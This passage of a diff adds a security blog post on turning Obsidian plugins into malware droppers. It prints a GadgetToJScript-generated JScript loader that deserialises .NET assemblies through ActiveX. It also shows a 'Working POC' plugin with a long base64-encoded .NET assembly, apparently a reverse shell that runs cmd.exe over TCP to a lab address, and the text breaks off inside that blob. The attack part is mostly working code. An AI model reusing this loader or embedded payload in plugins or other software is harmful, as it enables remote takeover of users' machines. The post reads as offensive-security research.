+                    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
+                }
+                <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
+            }
+        });
+        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">addSettingTab</span>(<span style="color:#66d9ef">new</span> <span style="color:#a6e22e">SampleSettingTab</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">app</span>, <span style="color:#66d9ef">this</span>));
+    };
+    <span style="color:#a6e22e">MyPlugin</span>.<span style="color:#a6e22e">prototype</span>.<span style="color:#a6e22e">onunload</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> () {
+        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#39;unloading plugin&#39;</span>);
+    };
+    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">MyPlugin</span>;
+}(<span style="color:#a6e22e">obsidian</span>.<span style="color:#a6e22e">Plugin</span>));
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">SampleModal</span> <span style="color:#f92672">=</span> <span style="color:#75715e">/** @class */</span> (<span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">_super</span>) {
+    <span style="color:#a6e22e">__extends</span>(<span style="color:#a6e22e">SampleModal</span>, <span style="color:#a6e22e">_super</span>);
+    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">SampleModal</span>(<span style="color:#a6e22e">app</span>) {
+        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">_super</span>.<span style="color:#a6e22e">call</span>(<span style="color:#66d9ef">this</span>, <span style="color:#a6e22e">app</span>) <span style="color:#f92672">||</span> <span style="color:#66d9ef">this</span>;
+    }
+    <span style="color:#a6e22e">SampleModal</span>.<span style="color:#a6e22e">prototype</span>.<span style="color:#a6e22e">onOpen</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> () {
+        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">contentEl</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">contentEl</span>;
+        <span style="color:#a6e22e">contentEl</span>.<span style="color:#a6e22e">setText</span>(<span style="color:#e6db74">&#39;Woah!&#39;</span>);
+    };
+    <span style="color:#a6e22e">SampleModal</span>.<span style="color:#a6e22e">prototype</span>.<span style="color:#a6e22e">onClose</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> () {
+        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">contentEl</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">contentEl</span>;
+        <span style="color:#a6e22e">contentEl</span>.<span style="color:#a6e22e">empty</span>();
+    };
+    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">SampleModal</span>;
+}(<span style="color:#a6e22e">obsidian</span>.<span style="color:#a6e22e">Modal</span>));
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">SampleSettingTab</span> <span style="color:#f92672">=</span> <span style="color:#75715e">/** @class */</span> (<span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">_super</span>) {
+    <span style="color:#a6e22e">__extends</span>(<span style="color:#a6e22e">SampleSettingTab</span>, <span style="color:#a6e22e">_super</span>);
+    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">SampleSettingTab</span>() {
+        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">_super</span> <span style="color:#f92672">!==</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">_super</span>.<span style="color:#a6e22e">apply</span>(<span style="color:#66d9ef">this</span>, <span style="color:#a6e22e">arguments</span>) <span style="color:#f92672">||</span> <span style="color:#66d9ef">this</span>;
+    }
+    <span style="color:#a6e22e">SampleSettingTab</span>.<span style="color:#a6e22e">prototype</span>.<span style="color:#a6e22e">display</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> () {
+        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">containerEl</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">containerEl</span>;
+        <span style="color:#a6e22e">containerEl</span>.<span style="color:#a6e22e">empty</span>();
+        <span style="color:#a6e22e">containerEl</span>.<span style="color:#a6e22e">createEl</span>(<span style="color:#e6db74">&#39;h2&#39;</span>, { <span style="color:#a6e22e">text</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;Settings for my awesome plugin.&#39;</span> });
+        <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">obsidian</span>.<span style="color:#a6e22e">Setting</span>(<span style="color:#a6e22e">containerEl</span>)
+            .<span style="color:#a6e22e">setName</span>(<span style="color:#e6db74">&#39;Setting #1&#39;</span>)
+            .<span style="color:#a6e22e">setDesc</span>(<span style="color:#e6db74">&#39;It\&#39;s a secret&#39;</span>)
+            .<span style="color:#a6e22e">addText</span>(<span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">text</span>) { <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">text</span>.<span style="color:#a6e22e">setPlaceholder</span>(<span style="color:#e6db74">&#39;Enter your secret&#39;</span>)
+            .<span style="color:#a6e22e">setValue</span>(<span style="color:#e6db74">&#39;&#39;</span>)
+            .<span style="color:#a6e22e">onChange</span>(<span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">value</span>) {
+            <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#39;Secret: &#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">value</span>);
+        }); });
+    };
+    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">SampleSettingTab</span>;
+}(<span style="color:#a6e22e">obsidian</span>.<span style="color:#a6e22e">PluginSettingTab</span>));
+
+<span style="color:#a6e22e">module</span>.<span style="color:#a6e22e">exports</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">MyPlugin</span>;
+
+</code></pre></div><h1 id="shellz">Shellz<a href="#shellz" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<h2 id="first-attempt">First Attempt<a href="#first-attempt" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Since we have the ability to write files to disk and execute commands on the victim I though lets take this a step further and drop some sort of beacon onto a device through the plugin.</p>
+<p>Commonly a JavaScript payload being used as a dropper utilises ActiveXObjects to access namespaces within Windows to extend functionality of the payload and WScript to execute shell commands on the system.</p>
+<p>This sounds like a good solution for our goals. Before we get writing our payload we need to understand what ActiveXObjects actually are.</p>
+<p>ActiveX is a deprecated framework that was used within web applications to improve functionality. Within ActiveX, an object is an instance of a class, for example, objects can reference native classes and namespaces within Windows environments, which stretches to  frameworks such as .NET allowing us to utilise namspaces within the .NET framework within a JavaScript application.</p>
+<p>One example commonly seen used in these types of droppers is the  <code>System.Security.Cryptography</code> namespace found within the .NET, this namespace contains classes of interest to an attacker such as <code>FromBase64Transform</code> which allows for their beacons to be decoded from <code>Base64</code> before being loaded into memory.</p>
+<p>So with that out the way, how are we actually going to get an executable loaded into memory?</p>
+<p>Well with thanks to Leo Stavliotis I was shown this awesome tool <a href="https://github.com/med0x2e/GadgetToJScript">GadgetToJScript</a>. Which takes .NET assemblies and provides JS code to load them into memory. It does this by generating serialised gadgets that can trigger .NET execution from JavaScript.</p>
+<h3 id="method">Method<a href="#method" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<ol>
+<li>Generate payload</li>
+<li>GadgetToJScript</li>
+<li>profit?</li>
+</ol>
+<p>To improve my chances of this working i used a simple payload at first as a POC which just pops a message box on screen.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#"><span style="color:#66d9ef">using</span> System.Windows.Forms;
+
+<span style="color:#66d9ef">namespace</span> TestAssembly
+{
+    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Program</span>
+    {
+        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> Main(<span style="color:#66d9ef">string</span>[] args)
+        {
+            go();
+        }
+        <span style="color:#66d9ef">public</span> Program()
+        {
+            go();
+        }
+
+        <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> go()
+        {
+            MessageBox.Show(<span style="color:#e6db74">&#34;Test Assembly !!&#34;</span>);
+        }
+    }
+}
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\D</span>ev1<span style="color:#ae81ff">\D</span>ocuments<span style="color:#ae81ff">\G</span>adgetToJScript2-2.0<span style="color:#ae81ff">\G</span>adgetToJScript2-2.0<span style="color:#ae81ff">\G</span>adgetToJScript<span style="color:#ae81ff">\b</span>in<span style="color:#ae81ff">\R</span>elease&gt;.<span style="color:#ae81ff">\G</span>adgetToJScript.exe -a <span style="color:#e6db74">&#34;C:\Users\Dev1\Documents\GadgetToJScript2-2.0\GadgetToJScript2-2.0\TestAssembly\bin\Release\TestAssembly.exe&#34;</span> -w js -b   
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>: Generating the js payload
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>: First stage gadget generation <span style="color:#66d9ef">done</span>.
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>: Loading your .NET assembly:C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\D</span>ev1<span style="color:#ae81ff">\D</span>ocuments<span style="color:#ae81ff">\G</span>adgetToJScript2-2.0<span style="color:#ae81ff">\G</span>adgetToJScript2-2.0<span style="color:#ae81ff">\T</span>estAssembly<span style="color:#ae81ff">\b</span>in<span style="color:#ae81ff">\R</span>elease<span style="color:#ae81ff">\T</span>estAssembly.exe
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>: Second stage gadget generation <span style="color:#66d9ef">done</span>.
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span>: Payload generation completed, check: test.js
+</code></pre></div><p>This is the output generated from the <code>GadgetToJScript</code> tool.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">
+<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">Base64ToStream</span>(<span style="color:#a6e22e">b</span>,<span style="color:#a6e22e">l</span>) {
+	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">enc</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ActiveXObject</span>(<span style="color:#e6db74">&#34;System.Text.ASCIIEncoding&#34;</span>);
+	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">length</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">enc</span>.<span style="color:#a6e22e">GetByteCount_2</span>(<span style="color:#a6e22e">b</span>);
+	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">ba</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">enc</span>.<span style="color:#a6e22e">GetBytes_4</span>(<span style="color:#a6e22e">b</span>);
+	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">transform</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ActiveXObject</span>(<span style="color:#e6db74">&#34;System.Security.Cryptography.FromBase64Transform&#34;</span>);
+	<span style="color:#a6e22e">ba</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">transform</span>.<span style="color:#a6e22e">TransformFinalBlock</span>(<span style="color:#a6e22e">ba</span>, <span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">length</span>);
+	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">ms</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ActiveXObject</span>(<span style="color:#e6db74">&#34;System.IO.MemoryStream&#34;</span>);
+	<span style="color:#a6e22e">ms</span>.<span style="color:#a6e22e">Write</span>(<span style="color:#a6e22e">ba</span>, <span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">l</span>);
+	<span style="color:#a6e22e">ms</span>.<span style="color:#a6e22e">Position</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">ms</span>;
+}
+
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">stage_1</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;[snipped for berevity]&#34;</span>;
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">stage_2</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;[snipped for berevity]&#34;</span>;
+
+<span style="color:#66d9ef">try</span> {
+
+	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">shell</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ActiveXObject</span>(<span style="color:#e6db74">&#39;WScript.Shell&#39;</span>);
+	<span style="color:#a6e22e">ver</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;v4.0.30319&#39;</span>;
+
+	<span style="color:#66d9ef">try</span> {
+		<span style="color:#a6e22e">shell</span>.<span style="color:#a6e22e">RegRead</span>(<span style="color:#e6db74">&#39;HKLM\\SOFTWARE\\Microsoft\\.NETFramework\\v4.0.30319\\&#39;</span>);
+	} <span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">e</span>) { 
+		<span style="color:#a6e22e">ver</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;v2.0.50727&#39;</span>;
+	}
+
+	<span style="color:#a6e22e">shell</span>.<span style="color:#a6e22e">Environment</span>(<span style="color:#e6db74">&#39;Process&#39;</span>)(<span style="color:#e6db74">&#39;COMPLUS_Version&#39;</span>) <span style="color:#f92672">=</span> <span style="color:#a6e22e">ver</span>;
+
+	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">ms_1</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Base64ToStream</span>(<span style="color:#a6e22e">stage_1</span>, <span style="color:#ae81ff">2341</span>);
+	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">fmt_1</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ActiveXObject</span>(<span style="color:#e6db74">&#39;System.Runtime.Serialization.Formatters.Binary.BinaryFormatter&#39;</span>);
+	<span style="color:#a6e22e">fmt_1</span>.<span style="color:#a6e22e">Deserialize_2</span>(<span style="color:#a6e22e">ms_1</span>);
+	
+} <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">e</span>) {
+	<span style="color:#66d9ef">try</span>{		
+		<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">ms_2</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Base64ToStream</span>(<span style="color:#a6e22e">stage_2</span>, <span style="color:#ae81ff">12424</span>);
+		<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">fmt_2</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ActiveXObject</span>(<span style="color:#e6db74">&#39;System.Runtime.Serialization.Formatters.Binary.BinaryFormatter&#39;</span>);
+		<span style="color:#a6e22e">fmt_2</span>.<span style="color:#a6e22e">Deserialize_2</span>(<span style="color:#a6e22e">ms_2</span>);
+
+	}<span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">e2</span>){
+		<span style="color:#a6e22e">alert</span>(<span style="color:#a6e22e">e2</span>);
+	}
+}
+</code></pre></div><p>Loading this into my obsidian plugin and running it throws me an error.</p>
+<p><img src="/images/obsidianactivexfail.png" alt="activex"></p>
+<p>As it turns out Obsidian doesn&rsquo;t allow ActiveXObjects to be created which is strange considering functions like <code>eval()</code> are allowed to run.</p>
+<h2 id="working-poc">Working POC<a href="#working-poc" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Potential routes:</p>
+<ul>
+<li><a href="https://nodejs.org/dist/latest/docs/api/addons.html">https://nodejs.org/dist/latest/docs/api/addons.html</a></li>
+</ul>
+<p>So since that method didn&rsquo;t work we will need to use an alternative method. We know we can execute command with  <code>child_process</code> feature within node. With this in mind, why don&rsquo;t we just load an assembly in memory manually with PowerShell.</p>
+<p>Ok lets do that.</p>
+<p>Essentially the steps are the same as before but with a slightly different execution. Previously we were referencing .NET name spaces through ActiveX objects, now we are going to reference them directly through the PowerShell CLI.</p>
+<p>A quick POC:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">obsidian</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;obsidian&#39;</span>);
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">fs</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;fs&#39;</span>);
+
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">extendStatics</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">d</span>, <span style="color:#a6e22e">b</span>) {
+    <span style="color:#a6e22e">extendStatics</span> <span style="color:#f92672">=</span> Object.<span style="color:#a6e22e">setPrototypeOf</span> <span style="color:#f92672">||</span>
+        ({ <span style="color:#a6e22e">__proto__</span><span style="color:#f92672">:</span> [] } <span style="color:#66d9ef">instanceof</span> Array <span style="color:#f92672">&amp;&amp;</span> <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">d</span>, <span style="color:#a6e22e">b</span>) { <span style="color:#a6e22e">d</span>.<span style="color:#a6e22e">__proto__</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">b</span>; }) <span style="color:#f92672">||</span>
+        <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">d</span>, <span style="color:#a6e22e">b</span>) { <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">p</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">b</span>) <span style="color:#66d9ef">if</span> (Object.<span style="color:#a6e22e">prototype</span>.<span style="color:#a6e22e">hasOwnProperty</span>.<span style="color:#a6e22e">call</span>(<span style="color:#a6e22e">b</span>, <span style="color:#a6e22e">p</span>)) <span style="color:#a6e22e">d</span>[<span style="color:#a6e22e">p</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">b</span>[<span style="color:#a6e22e">p</span>]; };
+    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">extendStatics</span>(<span style="color:#a6e22e">d</span>, <span style="color:#a6e22e">b</span>);
+};
+
+<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__extends</span>(<span style="color:#a6e22e">d</span>, <span style="color:#a6e22e">b</span>) {
+    <span style="color:#a6e22e">extendStatics</span>(<span style="color:#a6e22e">d</span>, <span style="color:#a6e22e">b</span>);
+    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__</span>() { <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">constructor</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">d</span>; }
+    <span style="color:#a6e22e">d</span>.<span style="color:#a6e22e">prototype</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">b</span> <span style="color:#f92672">===</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">?</span> Object.<span style="color:#a6e22e">create</span>(<span style="color:#a6e22e">b</span>) <span style="color:#f92672">:</span> (<span style="color:#a6e22e">__</span>.<span style="color:#a6e22e">prototype</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">b</span>.<span style="color:#a6e22e">prototype</span>, <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">__</span>());
+}
+
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">MyPlugin</span> <span style="color:#f92672">=</span> <span style="color:#75715e">/** @class */</span> (<span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">_super</span>) {
+    <span style="color:#a6e22e">__extends</span>(<span style="color:#a6e22e">MyPlugin</span>, <span style="color:#a6e22e">_super</span>);
+    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">MyPlugin</span>() {
+        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">_super</span> <span style="color:#f92672">!==</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">_super</span>.<span style="color:#a6e22e">apply</span>(<span style="color:#66d9ef">this</span>, <span style="color:#a6e22e">arguments</span>) <span style="color:#f92672">||</span> <span style="color:#66d9ef">this</span>;
+    }
+    <span style="color:#a6e22e">MyPlugin</span>.<span style="color:#a6e22e">prototype</span>.<span style="color:#a6e22e">onInit</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> () {
+    };
+    <span style="color:#a6e22e">MyPlugin</span>.<span style="color:#a6e22e">prototype</span>.<span style="color:#a6e22e">onload</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> () {
+        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">_this</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>;
+        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#39;loading plugin&#39;</span>);
+        
+        
+
+        <span style="color:#75715e">// node js exec function to execute payload on disk
+</span><span style="color:#75715e"></span>        
+        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">string2</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;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LgBzAC0BGgBxAASAAAABAAAAAAAAAAAAAAAAAHEEAAAEAAAAAAAAAAAAAAB7AB0AAAAAAAQAAAAAAAAAAAAAAHsAdgIAAAAAAAAAAAA8TW9kdWxlPgBTeXN0ZW0uSU8AZ2V0X0RhdGEAbXNjb3JsaWIAYWRkX091dHB1dERhdGFSZWNlaXZlZABBcHBlbmQASURpc3Bvc2FibGUAQ29uc29sZQBzZXRfRmlsZU5hbWUAQmVnaW5PdXRwdXRSZWFkTGluZQBXcml0ZUxpbmUAb3V0TGluZQBEaXNwb3NlAEd1aWRBdHRyaWJ1dGUARGVidWdnYWJsZUF0dHJpYnV0ZQBDb21WaXNpYmxlQXR0cmlidXRlAEFzc2VtYmx5VGl0bGVBdHRyaWJ1dGUAQXNzZW1ibHlUcmFkZW1hcmtBdHRyaWJ1dGUAVGFyZ2V0RnJhbWV3b3JrQXR0cmlidXRlAEFzc2VtYmx5RmlsZVZlcnNpb25BdHRyaWJ1dGUAQXNzZW1ibHlDb25maWd1cmF0aW9uQXR0cmlidXRlAEFzc2VtYmx5RGVzY3JpcHRpb25BdHRyaWJ1dGUAQ29tcGlsYXRpb25SZWxheGF0aW9uc0F0dHJpYnV0ZQBBc3NlbWJseVByb2R1Y3RBdHRyaWJ1dGUAQXNzZW1ibHlDb3B5cmlnaHRBdHRyaWJ1dGUAQXNzZW1ibHlDb21wYW55QXR0cmlidXRlAFJ1bnRpbWVDb21wYXRpYmlsaXR5QXR0cmlidXRlAHNldF9Vc2VTaGVsbEV4ZWN1dGUAUmVtb3ZlAFN5c3RlbS5SdW50aW1lLlZlcnNpb25pbmcAU3RyaW5nAEZsdXNoAGdldF9MZW5ndGgAVGVzdEFzc2VtYmx5LmRsbABOZXR3b3JrU3RyZWFtAEdldFN0cmVhbQBQcm9ncmFtAFN5c3RlbQBNYWluAFN5c3RlbS5SZWZsZWN0aW9uAEV4Y2VwdGlvbgBnZXRfU3RhcnRJbmZvAFByb2Nlc3NTdGFydEluZm8AU3RyZWFtUmVhZGVyAFRleHRSZWFkZXIAU3RyaW5nQnVpbGRlcgBDbWRPdXRwdXREYXRhSGFuZGxlcgBEYXRhUmVjZWl2ZWRFdmVudEhhbmRsZXIAU3RyZWFtV3JpdGVyAHN0cmVhbVdyaXRlcgBUZXh0V3JpdGVyAHNldF9SZWRpcmVjdFN0YW5kYXJkRXJyb3IALmN0b3IAU3lzdGVtLkRpYWdub3N0aWNzAFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcwBTeXN0ZW0uUnVudGltZS5Db21waWxlclNlcnZpY2VzAERlYnVnZ2luZ01vZGVzAERhdGFSZWNlaXZlZEV2ZW50QXJncwBhcmdzAHNlbmRpbmdQcm9jZXNzAFN5c3RlbS5OZXQuU29ja2V0cwBPYmplY3QAVGNwQ2xpZW50AFN0YXJ0AGdldF9TdGFuZGFyZElucHV0AHNldF9SZWRpcmVjdFN0YW5kYXJkSW5wdXQAc2V0X1JlZGlyZWN0U3RhbmRhcmRPdXRwdXQAU3lzdGVtLlRleHQAc2V0X0NyZWF0ZU5vV2luZG93AFRlc3RBc3NlbWJseQBJc051bGxPckVtcHR5AAAPVwBPAFIASwBJAE4ARwAAHTEAOQAyAC4AMQA2ADgALgA1ADYALgAxADAAMwAAD2MAbQBkAC4AZQB4AGUAAAD0hZ9Ycz6oTpVU+TkccvnBAAQgAQEIAyAAA